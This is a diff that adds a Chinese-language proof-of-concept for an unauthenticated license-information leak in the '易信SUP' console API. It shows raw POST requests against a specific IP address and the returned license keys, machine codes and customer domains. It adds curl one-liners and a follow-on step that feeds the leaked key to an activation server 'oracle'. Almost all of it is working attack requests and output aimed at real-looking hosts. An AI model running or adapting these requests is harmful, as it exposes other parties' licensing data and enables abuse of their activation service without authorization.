@@ -1,0 +1,42 @@
+# 易信SUP /api/console/Activate/GetStatus 未授权授权信息泄露
+# 判据：200 + code:0 + data.license_key / data.machine_code
+# 前置：控制台端口可达、实例已激活；无需 Cookie/Token/验证码
+
+### 1) 1.0.44 实例（8081）
+POST /api/console/Activate/GetStatus HTTP/1.1
+Host: 149.104.30.75:8081
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+# => HTTP 200
+# {"code":0,"data":{"activated":true,"days_left":319,"domains":"pc.kuaishou.xin",
+#  "expire_at":1821489306,"license_key":"YS-M85X-QC85-****-****",
+#  "machine_code":"2e90cf89791b827a","plan":"standard","locked":false,"status":1},
+#  "message":"ok"}
+
+### 2) 1.0.43 实例（8080）——同一 license_key，machine_code 不同，locked=true 仍回显
+POST /api/console/Activate/GetStatus HTTP/1.1
+Host: 149.104.30.75:8080
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+# => HTTP 200，同上结构，machine_code=b2d7279a95891033、locked=true、fail_cnt=6693
+
+### 3) 等价 curl
+curl -sS --noproxy '*' -i -X POST http://TARGET:8081/api/console/Activate/GetStatus \
+  -H 'Content-Type: application/json' -d '{}'
+
+### 4) 拿到 license_key 后接着打 8090 授权服务器 oracle
+curl -sS --noproxy '*' -X POST http://TARGET:8090/auth/activate \
+  -H 'Content-Type: application/json' \
+  -d '{"license_key":"<leaked>","machine_code":"2e90cf89791b827a","version":"1.0.44"}'
+
+# 说明：
+# - 响应里的 domains/expire_at/plan 为该授权绑定的客户域名、到期时间戳、套餐档位，
+#   可直接用于资产归属判断；fail_cnt 反映该 license 被多少机器/错误尝试用过。
+# - activated=false 时端点通常仍可访问，只是没有 license 字段。
+# - 若 404/401，见条目 usage 中的失败原因排查。
